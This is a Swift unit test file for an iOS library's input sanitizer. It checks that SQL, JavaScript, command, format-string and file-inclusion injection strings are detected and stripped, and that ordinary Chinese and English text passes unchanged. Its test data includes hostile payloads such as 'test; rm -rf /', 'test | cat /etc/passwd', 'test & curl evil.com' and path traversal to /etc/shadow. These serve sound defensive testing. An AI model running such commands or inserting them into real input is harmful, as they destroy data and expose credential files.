//
//  StringInjectionSanitizingTests.swift
//  BRFoundation
//
//  Created by BR on 2026/7/16.
//

import Foundation
import Testing
@testable import BRFoundation


@Suite("StringInjectionSanitizingTests")
struct StringInjectionSanitizingTests {

    // MARK: - 攻擊字串應被偵測 / 移除（對應行動應用APP基本資安檢測基準 v4.0 注入測項）

    @Test("SQL Injection - 'or 1=1'")
    func testSQLInjectionPayload() throws {
        let payload = "'or 1=1'"
        #expect(payload.br.matches(BRRegex.basicSQL))
        #expect(payload.br.removingBasicInjectionPatterns() != payload)
    }

    @Test("JavaScript Injection - <!--")
    func testJavaScriptInjectionPayload() throws {
        let payload = "<!--"
        #expect(payload.br.matches(BRRegex.basicJavaScript))
        #expect(payload.br.removingBasicInjectionPatterns() != payload)
    }

    @Test("Command Injection - ;ls;")
    func testCommandInjectionPayload() throws {
        let payload = ";ls;"
        #expect(payload.br.matches(BRRegex.basicCLI))
        #expect(payload.br.removingBasicInjectionPatterns() == ";")
    }

    @Test("Local File Inclusion - ./etc/passwd/0")
    func testLocalFileInclusionPayload() throws {
        let payload = "./etc/passwd/0"
        #expect(payload.br.matches(BRRegex.localFile))
        #expect(payload.br.removingBasicInjectionPatterns() != payload)
    }

    @Test("Security Test Payload - test & del file")
    func testXMLInjectionPayload() throws {
        let payload = "test & del file"
        #expect(payload.br.matches(BRRegex.securityTest))
        #expect(payload.br.removingBasicInjectionPatterns() != payload)
    }

    @Test("Format String Injection - ;%S%S%S%S%S;")
    func testFormatStringInjectionPayload() throws {
        let payload = ";%S%S%S%S%S;"
        #expect(payload.br.matches(BRRegex.formatString))
        #expect(payload.br.removingBasicInjectionPatterns() == ";;")
    }

    @Test("Format String Injection - 2 組即命中")
    func testFormatStringInjectionTwoGroups() throws {
        #expect(";%s%d;".br.matches(BRRegex.formatString))
        #expect("%@%s".br.matches(BRRegex.formatString))
        #expect(";%s%d;".br.removingBasicInjectionPatterns() == ";;")
    }

    @Test("IPC Injection - 'or 1=1' / ;ls;")
    func testIPCInjectionPayloads() throws {
        #expect("'or 1=1'".br.matches(BRRegex.basicSQL))
        #expect(";ls;".br.matches(BRRegex.basicCLI))
    }

    // MARK: - 額外常見注入變形，確保覆蓋率足夠

    @Test("SQL Injection 變形")
    func testAdditionalSQLPayloads() throws {
        #expect("' or 1=1 --".br.matches(BRRegex.basicSQL))
        #expect("UNION SELECT password FROM users".br.matches(BRRegex.basicSQL))
        #expect("DROP TABLE users".br.matches(BRRegex.basicSQL))
        #expect("INSERT INTO users VALUES (1)".br.matches(BRRegex.basicSQL))
        #expect("DELETE FROM users".br.matches(BRRegex.basicSQL) == false)
    }

    @Test("JavaScript Injection 變形")
    func testAdditionalJavaScriptPayloads() throws {
        #expect("<script>alert(1)</script>".br.matches(BRRegex.basicJavaScript))
        #expect("javascript:alert(1)".br.matches(BRRegex.basicJavaScript))
        #expect("<img src=x onerror=alert(1)>".br.matches(BRRegex.basicJavaScript))
        #expect("<div onclick=\"alert(1)\">".br.matches(BRRegex.basicJavaScript))
    }

    @Test("Command Injection 變形")
    func testAdditionalCommandInjectionPayloads() throws {
        #expect("test; rm -rf /".br.matches(BRRegex.basicCLI))
        #expect("test | cat /etc/passwd".br.matches(BRRegex.basicCLI))
        #expect("test & curl evil.com".br.matches(BRRegex.basicCLI))
    }

    @Test("Local File Inclusion 變形")
    func testAdditionalLocalFilePayloads() throws {
        #expect("../../../etc/passwd".br.matches(BRRegex.localFile))
        #expect("..\\..\\windows\\win.ini".br.matches(BRRegex.localFile))
        #expect("file:///etc/shadow".br.matches(BRRegex.localFile))
    }

    // MARK: - 誤傷風險：正常使用者輸入不應被誤判 / 誤刪

    @Test("正常中文輸入不受影響")
    func testNormalChineseInputUnaffected() throws {
        let inputs = [
            "王小明的清潔公司，服務很棒！",
            "地址：台北市信義區松高路1號，電話 0912345678",
            "這次的服務品質很好，下次還會再約",
            "家事清潔、廚房深層清潔都包含在內",
        ]
        for input in inputs {
            #expect(input.br.removingBasicInjectionPatterns() == input)
        }
    }

    @Test("含分隔符號但非指令的正常輸入不受影響")
    func testNormalPunctuationInputUnaffected() throws {
        let inputs = [
            "A & B 清潔公司",
            "王先生 & 家人",
            "價格：500元 / 小時",
            "24小時客服專線",
            "Tom & Catherine 打掃團隊",
            "cats & shoes 寵物用品店",
        ]
        for input in inputs {
            #expect(input.br.removingBasicInjectionPatterns() == input)
        }
    }

    @Test("含 key=value 樣式文字不應被 JavaScript 偵測誤判")
    func testKeyValueStyleTextUnaffected() throws {
        let inputs = [
            "actionType=1&sectionName=test",
            "versionCode=100&versionName=1.0.0",
            "duration=5&position=top",
            "https://example.com/service?commonName=test&sessionId=3",
        ]
        for input in inputs {
            #expect(input.br.removingBasicInjectionPatterns() == input)
        }
    }

    @Test("含英文詞彙但非 SQL 關鍵字語句不應被誤判")
    func testEnglishWordsResemblingSQLUnaffected() throws {
        let inputs = [
            "Reunion selects committee members every year",
            "Please insert your card into the reader",
        ]
        for input in inputs {
            #expect(input.br.removingBasicInjectionPatterns() == input)
        }
    }

    @Test("delete from 這類常見英文片語不應被誤判")
    func testDeleteFromPhraseUnaffected() throws {
        let inputs = [
            "We will delete from the list later",
            "Please delete from my favorites",
        ]
        for input in inputs {
            #expect(input.br.removingBasicInjectionPatterns() == input)
        }
    }

    @Test("URL 百分比編碼中文字不應被 Format String 偵測誤判")
    func testPercentEncodedChineseUnaffected() throws {
        // "中文字" 的 UTF-8 percent-encoding
        let input = "%E4%B8%AD%E6%96%87%E5%AD%97"
        #expect(input.br.matches(BRRegex.formatString) == false)
        #expect(input.br.removingBasicInjectionPatterns() == input)
    }

    @Test("單一 % 加英文單字（無空格百分比寫法）不應被 Format String 誤判")
    func testSinglePercentLetterUnaffected() throws {
        // 門檻維持在 2 組以上，避免像 "100%satisfaction"、"50%off" 這類常見英文寫法被誤判
        let inputs = [
            "100%satisfaction guaranteed",
            "50%off this weekend",
            "5%的優惠",
        ]
        for input in inputs {
            #expect(input.br.matches(BRRegex.formatString) == false)
            #expect(input.br.removingBasicInjectionPatterns() == input)
        }
    }

    @Test("正常路徑或網址不應被 Local File 偵測誤判")
    func testNormalPathsUnaffected() throws {
        let inputs = [
            "https://pro360.com.tw/service/123",
            "photo.jpg",
            "assets/images/logo.png",
        ]
        for input in inputs {
            #expect(input.br.removingBasicInjectionPatterns() == input)
        }
    }
}
